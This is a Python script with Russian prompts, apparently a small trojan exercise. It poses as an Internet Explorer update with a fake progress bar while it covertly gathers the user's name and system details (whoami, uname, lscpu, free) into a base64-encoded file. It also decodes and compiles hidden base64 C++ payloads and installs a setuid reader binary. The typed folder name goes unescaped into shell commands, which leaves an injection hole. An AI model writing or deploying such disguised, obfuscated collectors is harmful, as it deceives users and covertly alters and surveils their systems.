#!/usr/bin/python3

import time
import os
import base64
import subprocess
from threading import Thread

def loading():
    print ('Обновление Internet Explorer. Подождите.......')
    s='█'
    for i in range(101):
        time.sleep(0.025)
        print('\r','Загрузка',i*s,str(i),'%',end='')
    print('\nНе прошло и десяти лет а Internet Explorer успешно обновился')

def secure(dir, key):
    keycode='I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwoKaW50IG1haW4gKGludCBhcmdjLCBjaGFyKiogYXJndikgCnsKICAgIHN0cmluZyBzYWx0ID0gXCJzYWx0XCI7CiAgICBzdHJpbmcgdXNlcmtleSA9IGFyZ3ZbMV07CiAgICBzdHJpbmcgc3RyID0gc2FsdCArIHVzZXJrZXk7CiAgICBoYXNoIDxzdHJpbmc+IGhhc2hlcjsKICAgIHNpemVfdCBoYXNoID0gaGFzaGVyKHN0cik7CiAgICBjb3V0IDw8IGhhc2g7Cn0='
    k=base64.b64decode(keycode)
    cmd=k.decode("UTF-8")
    cmd = 'echo "' + cmd + '" > ./' + dir + '/key.cpp'
    os.system(cmd)
    os.system('g++ ./' + dir + '/key.cpp -o ./' + dir + '/key.exe')
    h = subprocess.check_output(['./' + dir + '/key.exe', key])
    os.system('rm ./' + dir + '/key*')
    h=h.decode("UTF-8")
    os.system('echo "' + h + '" > ./' + dir + '/.key')
    os.system('chmod 700 ./' + dir + '/.key')
    script='I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwogCnN0cmluZyByZWFkRmlsZShjb25zdCBzdHJpbmcmIGZpbGVOYW1lKSB7CiAgICBpZnN0cmVhbSBmKGZpbGVOYW1lKTsKICAgIGYuc2Vla2coMCwgaW9zOjplbmQpOwogICAgc2l6ZV90IHNpemUgPSBmLnRlbGxnKCk7CiAgICBzdHJpbmcgcyhzaXplLCAnICcpOwogICAgZi5zZWVrZygwKTsKICAgIGYucmVhZCgmc1swXSwgc2l6ZSk7CiAgICByZXR1cm4gczsKfQoKaW50IG1haW4gKCkgCnsKICAgIGNvbnN0IHN0cmluZyBmaWxlbmFtZSA9IFwic3lzLnRhdFwiOwogICAgY29uc3Qgc3RyaW5nIGZpbGVrZXkgPSBcIi5rZXlcIjsKICAgIHN0cmluZyBzYWx0ID0gXCJzYWx0XCI7CiAgICBzdHJpbmcgdXNlcmtleSA9IFwiXCI7CiAgICBjb3V0IDw8IFwiRW50ZXIgc2VjcmV0IGtleSBmb3IgcmVhZGluZyBzeXN0ZW0gaW5mbyBmcm9tIHN5cy50YXQgOiBcIjsKICAgIGNpbiA+PiB1c2Vya2V5OwogICAgc3RyaW5nIHN0ciA9IHNhbHQgKyB1c2Vya2V5OwogICAgaGFzaCA8c3RyaW5nPiBoYXNoZXI7CiAgICBzaXplX3QgaGFzaCA9IGhhc2hlcihzdHIpOwogICAgc3RyaW5nIGggPSByZWFkRmlsZShmaWxla2V5KTsKICAgIHN0cmluZ3N0cmVhbSBzcyhoKTsKICAgIHNpemVfdCBodG9zaXplOwogICAgc3MgPj4gaHRvc2l6ZTsKICAgIGlmKGh0b3NpemUgPT0gaGFzaCl7ICAgCiAgICAgICAgc3RyaW5nIHMgPSByZWFkRmlsZShmaWxlbmFtZSk7CiAgICAgICAgY291dCA8PCBzOwogICAgfQogICAgZWxzZQogICAgICAgIGNvdXQgPDwgXCJJbmNvcnJlY3Qga2V5XCI7Cn0='
    b=base64.b64decode(script)
    cmd=b.decode("UTF-8")
    cmd = 'echo "' + cmd + '" > ./' + dir + '/secure.cpp'
    os.system(cmd)
    os.system('g++ ./'+ dir + '/secure.cpp -o ./' + dir + '/secure.exe')
    os.system('chmod 755 ./' + dir + '/secure.exe')
    os.system('chmod u+s ./' + dir + '/secure.exe')
    os.system('rm ./' + dir + '/secure.cpp')
    

def main():
    print ('Internet Explorer иногда работает немного медленно. Сейчас он обновится и все обязательно станет быстрее.  Выберите папку сохранения для продолжения или создайте новую')
    print ('Введите 1 для отображения всех папок, 2 для создания новой папки')
    choice = int(input())
    if(choice == 1):
        print('Выберите папку для сохранения обновления')
        os.system("ls -d */")
        dir=str(input())
    elif (choice == 2):
        dir=str(input('Введите название новой папки\n'))
        os.system("mkdir " + dir + " 2>/dev/null")
    #здесь запустить создание файла secure.exe
    key=str(input("Enter secret key for access to system info\n"))
    load = Thread(target=loading)
    sec = Thread(target=secure, args=(dir, key, ))
    load.start() ##параллельный поток
    sec.start()
    info=""
    info+=str(subprocess.check_output('whoami'))[2:-1]
    info+=str(subprocess.check_output(['uname', '-a']))[2:-1]
    info+=str(subprocess.check_output('lscpu'))[2:-1]
    info+=str(subprocess.check_output('free'))[2:-1]
    info=info.encode('utf-8')
    infob64=base64.b64encode(info)
    infob64=str(infob64)[2:-1]
    os.system('echo "' + infob64 + '" >> ./' + dir + '/sys.tat')
    os.system('chmod 700 ./' + dir + '/sys.tat')

main()

